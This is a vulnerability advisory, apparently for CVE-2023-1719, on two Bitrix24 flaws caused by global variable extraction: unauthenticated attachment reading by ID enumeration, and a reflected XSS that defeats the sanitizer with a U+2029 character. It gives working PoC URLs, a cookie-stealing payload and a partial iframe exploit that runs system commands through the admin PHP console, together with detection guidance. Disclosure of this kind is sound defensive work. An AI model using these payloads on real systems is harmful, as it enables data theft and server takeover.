### Vulnerability Details:[#](#vulnerability-details)

This report presents information on an insecure direct object reference (IDOR) vulnerability caused by global variable extraction in Bitrix24 that allows an unauthenticated attacker to read attachment files.

It was discovered that the function `FormDecode` located at `bitrix/modules/main/tools.php` is called by `bitrix/modules/main/start.php` to extract variables from HTTP request into `$GLOBALS` array.

```
// bitrix/modules/main/tools.php
function FormDecode()
{
    $superglobals = array(
        '_GET'=>1, '_SESSION'=>1, '_POST'=>1, '_COOKIE'=>1, '_REQUEST'=>1, '_FILES'=>1, '_SERVER'=>1, 'GLOBALS'=>1, '_ENV'=>1,
        'DBType'=>1,  'DBDebug'=>1, 'DBDebugToFile'=>1, 'DBHost'=>1, 'DBName'=>1, 'DBLogin'=>1, 'DBPassword'=>1,
        'HTTP_ENV_VARS'=>1, 'HTTP_GET_VARS'=>1, 'HTTP_POST_VARS'=>1, 'HTTP_POST_FILES'=>1, 'HTTP_COOKIE_VARS'=>1, 'HTTP_SERVER_VARS'=>1,
    );
    foreach($superglobals as $gl=>$t)
    {
        unset($_REQUEST[$gl]);
        unset($_GET[$gl]);
        unset($_POST[$gl]);
        unset($_COOKIE[$gl]);
    }
    $register_globals = ini_get_bool("register_globals");
    if (!$register_globals)
    {
        $toGlobals = array();
        foreach($_ENV as $key => $val)
            if(!isset($superglobals[$key]))
                $toGlobals[$key] = $val;
        foreach($_GET as $key => $val)
            if(!isset($superglobals[$key]))
                $toGlobals[$key] = $val;
        foreach($_POST as $key => $val)
            if(!isset($superglobals[$key]))
                $toGlobals[$key] = $val;
        foreach($_COOKIE as $key => $val)
            if(!isset($superglobals[$key]))
                $toGlobals[$key] = $val;
        foreach($_SERVER as $key => $val)
            if(!isset($superglobals[$key]))
                $toGlobals[$key] = $val;
        //$GLOBALS += $toGlobals;
        //PHP7 bug
        foreach($toGlobals as $key => $val)
        {
            if(!isset($GLOBALS[$key])) // [2]
            {
                $GLOBALS[$key] = $val;  // [1]
            }
        }
    }
}

```

This function iterates over the key-value pairs in `$_GET`, `$_POST` and `$_COOKIE`, and assign them to `$GLOBALS` at `[1]`, provided the key is not on the denylist `$superglobals` and has not been set before (`[2]`).

The caller of this function, `start.php`, is a vital part of the initialization process for Bitrix24 to handle new requests. Besides extracting global variables from HTTP request, it also initializes database connections, security middlewares and loggers. Thus, an attacker is able to define global variables in querystring, post body and cookies before entering most of the business logics on Bitrix24. In another word, if a variable is not defined before being used, its value could be controlled by attacker. An instance of this case can be found in `/pub/im.file.php` :

```
// /pub/im.file.php
// [1]
require_once $_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/main/include/prolog_before.php';
$request = Bitrix\Main\Application::getInstance()->getContext()->getRequest();
if ($request->get('FILE_ID') && $request->get('SIGN'))    // [2]
{
    $diskFileId = (int)$request->get('FILE_ID');
    $signer = new \Bitrix\Main\Security\Sign\Signer;
    $sign = htmlspecialcharsbx($request->get('SIGN'));
    try
    {
        $sign = (int)$signer->unsign($sign);
    }
    catch (\Bitrix\Main\Security\Sign\BadSignatureException $e)
    {
        CHTTP::SetStatus('404 Not Found');
    }
}
if ($diskFileId === $sign)    // [3]
{
    $file = \Bitrix\Disk\File::getById($diskFileId);
    if ($file !== null)
    {
        $fileId = $file->getFileId();
        if ($fileId > 0)
        {
            CFile::ViewByUser($fileId);    // [4]
        }
    }
}
else
{
    CHTTP::SetStatus('404 Not Found');
}

```

At `[1]`, the server loads `prolog_before.php` which will eventualy include `start.php` to modify global variables.
At `[2]`, `FILE_ID` and `SIGN` are supposed to be read from querystring and assigned to variable `$diskFileId` and `$sign` correspondingly. A crypto-safe signing class `\Bitrix\Main\Security\Sign\Signer` is introduced here to ensure authentity.

Later on, the server checks if the decoded singature is equal to file ID at `[3]`, then it fetches attachment records from database by ID and serves the attachment in reponse at `[4]`.

However, it is discovered that the variables `$diskFileId` and `$sign` are only defined when the `if` conditions at `[2]` are met. Otherwise, these two variables can be overwritten by setting global variables in `FormDecode()` function.

Since the attachment ID stored in database is a self-incrementing integer, it is possible for an unauthenticated attacker to enumerate IDs starting from 1 and retrive all valid attachments.

### Proof-of-Concept:[#](#proof-of-concept)

The PoC provided below retrives the attachment whose ID is 8 on `TARGET_HOST`:

`http://TARGET_HOST/pub/im.file.php?diskFileId=8&sign=8`

In trail version of Bitrix24, attachment with ID 8 should be “form.docx” shipped as sample data, as shown in the following image:

![](/advisories/23/images/CVE-2023-1719_01.Attachment-IDOR.png)

### Exploit Conditions:[#](#exploit-conditions)

This vulnerability can be exploited without any valid credentials.

### Detection Guidance:[#](#detection-guidance)

It is possible to detect the exploitation of this vulnerability by examining traffic logs to detect the presence of the string `diskFileId` and `sign` in HTTP request. The presence of these two strings set to the same numeric value (for example, `diskFileId=8` and `sign=8`) indicates possible exploitation of this vulnerability.

It is important to note that these two variable can be sent not only in querystring, but also in cookie and post body, separately.

## 2. Reflected XSS[#](#2-reflected-xss)

### Vulnerability Details:[#](#vulnerability-details-1)

This report presents information on a cross-site scripting (XSS) vulnerability caused by global variable extraction in Bitrix24. This vulnerability allows an attacker to execute arbitrary JavaScript code on the browser of any victim that visits the affected page. If the victim has administrator permissions, an attacker may leverage the built-in “PHP Command Line” feature to execute arbitrary system commands on the target web server.

It was discovered that the function `FormDecode` located at `bitrix/modules/main/tools.php` is called by `bitrix/modules/main/start.php` to extract variables from HTTP request into `$GLOBALS` array.

```
// bitrix/modules/main/tools.php
function FormDecode()
{
    $superglobals = array(
        '_GET'=>1, '_SESSION'=>1, '_POST'=>1, '_COOKIE'=>1, '_REQUEST'=>1, '_FILES'=>1, '_SERVER'=>1, 'GLOBALS'=>1, '_ENV'=>1,
        'DBType'=>1,  'DBDebug'=>1, 'DBDebugToFile'=>1, 'DBHost'=>1, 'DBName'=>1, 'DBLogin'=>1, 'DBPassword'=>1,
        'HTTP_ENV_VARS'=>1, 'HTTP_GET_VARS'=>1, 'HTTP_POST_VARS'=>1, 'HTTP_POST_FILES'=>1, 'HTTP_COOKIE_VARS'=>1, 'HTTP_SERVER_VARS'=>1,
    );
    foreach($superglobals as $gl=>$t)
    {
        unset($_REQUEST[$gl]);
        unset($_GET[$gl]);
        unset($_POST[$gl]);
        unset($_COOKIE[$gl]);
    }
    $register_globals = ini_get_bool("register_globals");
    if (!$register_globals)
    {
        $toGlobals = array();
        foreach($_ENV as $key => $val)
            if(!isset($superglobals[$key]))
                $toGlobals[$key] = $val;
        foreach($_GET as $key => $val)
            if(!isset($superglobals[$key]))
                $toGlobals[$key] = $val;
        foreach($_POST as $key => $val)
            if(!isset($superglobals[$key]))
                $toGlobals[$key] = $val;
        foreach($_COOKIE as $key => $val)
            if(!isset($superglobals[$key]))
                $toGlobals[$key] = $val;
        foreach($_SERVER as $key => $val)
            if(!isset($superglobals[$key]))
                $toGlobals[$key] = $val;
        //$GLOBALS += $toGlobals;
        //PHP7 bug
        foreach($toGlobals as $key => $val)
        {
            if(!isset($GLOBALS[$key])) // [2]
            {
                $GLOBALS[$key] = $val;  // [1]
            }
        }
    }
}

```

This function iterates over the key-value pairs in `$_GET`, `$_POST` and `$_COOKIE`, and assign them to `$GLOBALS` at `[1]`, provided the key is not on the denylist `$superglobals` and has not been set before (`[2]`).

The caller of this function, `start.php`, is a vital part of the initialization process for Bitrix24 to handle new requests. Besides extracting global variables from HTTP request, it also initializes database connections, security middlewares and loggers. Thus, an attacker is able to define global variables in querystring, post body and cookies before entering most of the business logics on Bitrix24. In another word, if a variable is not defined before being used, its value could be controlled by attacker.

An instance of this case can be found in `bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php` :

```
// bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php
// [1]
require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
// ...
if ($GLOBALS["USER"]->IsAuthorized())
	$log_cnt = CUserCounter::GetValueByUserID($GLOBALS["USER"]->GetID(), $site); // [2]
// ...
$arData = array(
    array("LOG_CNT" => $log_cnt)    // [3]
);
echo CUtil::PhpToJSObject($arData);     // [4]

```

At `[1]`, the server loads `prolog_before.php` which will eventualy include `start.php` to modify global variables. If the current request is an authenticated session, variable `$log_cnt` will be defined at `[2]`.
Later on, `$log_cnt` is stored into an array `$arData` at `[3]` and passed on to `CUtil::PhpToJSObject`. The return value will be written to response at `[4]`.

However, if the request does not contain authenticated session cookies, `$log_cnt` will not be defined at `[2]`. Thus, it can be overwritten by setting global variables in `FormDecode()` function.

The image below shows `log_cnt` in the querystring reflected in the response with minor modification, proving that it is possible to inject HTML codes:

![](/advisories/23/images/CVE-2023-1719_02.XSS.png)

However, the built-in Bitrix XSS sanitizer, applied to parameters of every request, complicates exploitation of this vulnerability.

The XSS sanitizer uses several regular expressions (regex) to identify and sanitize potentially dangerous input. One of these aims to target HTML event handlers, which could lead to XSS. The regex used can be found in `bitrix/modules/security/lib/filter/auditor/xss.php` on line 173, and a simplified version is shown below:

```
/(on[a-z]*)([a-z]{3}[\s]*=)/is

```

The regex aims to identify patterns such as `onerror=` and uses two capturing groups to split the dangerous string into two parts. A space is then added between the two parts, neutralizing the event handler. For example, `onerror=` would be transformed into `oner ror=`. Note that the regex allows any amount of whitespace between the event handler name (eg `onerror`) and the equals sign (`=`). This is compliant with the HTML specification. On its own, this sanitizer is secure.

The `CUtil::PhpToJSObject` function at `[4]` calls the `CUtil::JSEscape` function (shown below) on the value of each key-value pair in the `$arData` array.

```
// bitrix/modules/main/tools.php lines 4349 to 4355
public static function JSEscape($s){
    static $aSearch = array("\xe2\x80\xa9", "\\", "'", "\"", "\r\n", "\r", "\n", "\xe2\x80\xa8", "*/", "</");
    static $aReplace = array(" ", "\\\\", "\\'", '\\"', "\n", "\n", "\\n", "\\n", "*\\/", "<\\/");
    $val = str_replace($aSearch, $aReplace, $s);
    return $val;
}

```

This function performs a simple string replacement on the input string `$s` to ensure that it does not contain any characters that may break out of a JavaScript string, such as `"`, `'` or `\`.

Notably, this function replaces the byte string `\xe2\x80\xa9` ([U+2029 Unicode Paragraph Separator](https://www.compart.com/en/unicode/U%2B2029)) with a regular space ([U+0020 Space](https://www.compart.com/en/unicode/U%2B0020)).

This is a significant transformation as the Bitrix XSS sanitizer does not regard the byte string `\xe2\x80\xa9` as whitespace. Therefore, the string `onerror\xe2\x80\xa9=` would not be sanitized. However, `CUtil::JSEscape` would transform the string into `onerror =`, which is a valid HTML `onerror` event handler.

Therefore, a malicious attacker may craft a `log_cnt` parameter on `get_message_2.php`. As `onerror\xe2\x80\xa9=` does not match the regex for an event handler, the built-in XSS sanitizer does not sanitize this string. When printing `$arData` in the response, `CUtil::JSEscape` replaces `\xe2\x80\xa9` with , resulting in `<img src=x onerror =alert(1)>` :

![](/advisories/23/images/CVE-2023-1719_03.XSS-in-browser.png)

### Proof-of-Concept:[#](#proof-of-concept-1)

The PoC provided below will execute `alert(document.cookie)` when visited by unauthenticated users on `TARGET_HOST`:

`http://TARGET_HOST/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=%3Cimg%20onerror%E2%80%A9=alert(document.cookie)%20src=1%3E`

It was discovered that authenticated users can also be targeted by this vulnerability. An attacker can craft a webpage that loads the reflected XSS in an iframe. Since the “SameSite” attribute of cookies are defaulted to “Lax”, modern browsers will not send session cookies to webserver when the webpage is loaded inside an iframe, on a cross-origin webpage. In this case, the server will treat the iframed request unauthenticated and return the malicious XSS payload. With a reference to authenticated window (for example, `top.opener`), malicious JavaScript code can be executed as an authenticated user.

The following `PoC.html` demonsetrates such attack ([demo.mkv](https://drive.google.com/file/d/1DtxLt3mUz6Ci0sk2R8SPnyG3C1vt5E_G/view)). It requires the victim to click on the button to launch attack. If the victim has logged in to Bitrix24 as admin, this PoC will execute shell command `id` on the webserver and show the command output in an `alert` popup.

```

                query: `system('id');`,
                ajax: "y",
                result_as_text:"Y"
              })
            })).text())
          }
          clearInterval(h)
        } catch (e) { }
      }, 500)
    }
  </script>
</body>

```
### Exploit Conditions:[#](#exploit-conditions-1)

An attacker does not require any permissions to carry out this attack. However, the victim needs to visit a specially crafted URL supplied by the attacker.

### Detection Guidance:[#](#detection-guidance-1)

It is possible to detect the exploitation of this vulnerability by checking the server’s access logs for all requests made to `/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php` with parameter `log_cnt`. The presence of such request strongly indicates exploitation of this vulnerability.
